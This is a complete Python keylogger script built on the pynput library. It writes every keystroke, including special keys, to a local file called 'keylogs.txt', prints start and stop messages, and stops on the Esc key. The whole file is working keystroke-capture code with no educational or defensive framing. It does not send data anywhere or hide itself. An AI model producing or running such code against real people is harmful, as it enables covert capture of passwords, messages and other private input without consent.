from pynput.keyboard import Key, Listener
LOG_FILE = "keylogs.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        print("Keylogger stopped.")
        return False

def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
